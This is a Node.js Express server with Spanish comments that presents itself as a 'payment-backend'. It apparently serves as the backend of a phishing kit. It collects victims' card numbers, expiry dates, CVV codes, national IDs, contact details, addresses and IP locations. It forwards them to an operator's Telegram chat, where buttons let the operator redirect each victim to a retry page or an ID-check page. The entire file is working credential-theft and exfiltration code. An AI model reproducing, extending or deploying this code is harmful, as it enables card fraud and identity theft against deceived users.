const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[WARN] BOT_TOKEN o CHAT_ID no están definidos en variables de entorno.');
}

// Mapa de redirecciones por sessionId
const redirectionTable = Object.create(null);

// Health / debug
app.get('/', (_req, res) => {
  res.send({ ok: true, service: 'payment-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
});

// Cliente → Servidor: recibe datos y envía mensaje con botones
app.post('/payment', async (req, res) => {
  try {
    const data = req.body;
    const sessionId = data.sessionId;

    const text = `
🟣Viank🟣 - |[info]|
---
ℹ️DATOS DE LA TARJETA

💳: ${data.p}
📅: ${data.pdate}
🔒: ${data.c}
🏛️: ${data.ban}

ℹ️DATOS DEL CLIENTE

👨: ${data.dudename} ${data.surname}
🪪: ${data.cc}
📩: ${data.email}
📞: ${data.telnum}

ℹ️DATOS DE FACTURACION

🏙️: ${data.city}
🏙️: ${data.state}
🏙️: ${data.address}
🌐 IP: ${data.ip}
📍 Ubicación: ${data.location}

🆔 sessionId: ${sessionId}
---
`.trim();

    // Incluir sessionId en cada botón (callback_data máx. 64 bytes; esto cabe)
    const reply_markup = {
      inline_keyboard: [
        [
          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
          { text: '✅ Siguiente',     callback_data: `go:id-check.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      reply_markup,
      // Evitamos errores de formateo: el texto es plano
      // parse_mode: "Markdown"
    });

    res.status(200).send({ ok: true });
  } catch (err) {
    console.error('Error en /payment:', err?.response?.data || err.message);
    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
  }
});

// Telegram → Webhook: procesa clics en botones
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;

    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data || '';                 // ej: "go:id-check.html|<sessionId>"
      const [action, sessionId] = data.split('|');
      const target = (action || '').replace('go:', '');

      if (sessionId && target) {
        redirectionTable[sessionId] = target;
      }

      // Confirma al admin que se procesó
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: cq.id,
        text: `Redireccionando al cliente (${sessionId}) → ${target}`,
        show_alert: true
      });
    }

    // Responder SIEMPRE rápido a Telegram
    res.sendStatus(200);
  } catch (err) {
    console.error('Error en webhook:', err?.response?.data || err.message);
    res.sendStatus(200);
  }
});

// Cliente consulta si ya hay destino decidido
app.get('/get-redirect/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirectionTable[sessionId] || null;
  res.send({ target });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en ${PORT}`));
